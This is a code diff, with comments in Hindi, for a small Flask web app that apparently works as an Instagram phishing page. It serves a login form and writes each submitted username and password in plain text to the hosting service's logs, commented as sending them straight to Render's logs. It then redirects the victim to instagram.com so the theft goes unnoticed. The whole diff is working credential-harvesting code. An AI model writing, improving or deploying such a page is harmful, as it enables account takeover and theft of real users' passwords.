@@ -1,12 +1,24 @@
-import sys # Ye line sabse upar honi chahiye
+import sys
+from flask import Flask, render_template, request, redirect
 
-# Login function ke andar ye badlav karein
+app = Flask(__name__, template_folder='templates')
+
+@app.route('/')
+def index():
+    return render_template('login.html')
+
 @app.route('/login', methods=['POST'])
 def login():
     username = request.form.get('username')
     password = request.form.get('password')
     
-    # Ye line data ko "Zabardasti" logs mein dikhayegi
-    print(f"--- NEW LOGIN: {username} | {password} ---", file=sys.stderr, flush=True)
+    # Ye lines data ko turant Render ke logs mein bhejengi
+    print(f"\n--- NEW LOGIN DETECTED ---", file=sys.stderr, flush=True)
+    print(f"USERNAME: {username}", file=sys.stderr, flush=True)
+    print(f"PASSWORD: {password}", file=sys.stderr, flush=True)
+    print(f"--------------------------\n", file=sys.stderr, flush=True)
     
     return redirect("https://www.instagram.com")
+
+if __name__ == "__main__":
+    app.run(host='0.0.0.0', port=5000)
